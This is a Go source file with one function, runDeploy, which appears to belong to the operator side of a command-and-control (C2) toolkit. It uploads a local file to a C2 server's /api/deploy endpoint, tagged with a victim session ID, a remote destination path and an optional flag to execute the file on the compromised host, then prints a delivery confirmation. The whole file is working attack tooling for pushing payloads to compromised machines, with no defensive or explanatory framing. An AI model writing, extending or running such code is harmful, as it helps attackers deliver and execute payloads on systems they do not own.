package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func runDeploy(c2URL, sessionID, filePath, remotePath string, execute bool) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("read file: %w", err)
	}

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	writer.WriteField("session_id", sessionID)
	writer.WriteField("file_path", remotePath)
	if execute {
		writer.WriteField("execute", "true")
	}

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("create form file: %w", err)
	}
	part.Write(data)
	writer.Close()

	url := c2URL + "/api/deploy"
	req, err := http.NewRequest("POST", url, &body)
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("deploy request: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("deploy failed (%d): %s", resp.StatusCode, string(respBody))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return fmt.Errorf("parse response: %w", err)
	}

	fmt.Printf("[+] File queued for delivery\n")
	fmt.Printf("    Session:  %s\n", sessionID[:8])
	fmt.Printf("    File:     %s (%d bytes)\n", filepath.Base(filePath), len(data))
	fmt.Printf("    Remote:   %s\n", remotePath)
	fmt.Printf("    Execute:  %v\n", execute)
	if did, ok := result["delivery_id"]; ok && did != nil {
		fmt.Printf("    Delivery: %v\n", did)
	}
	return nil
}
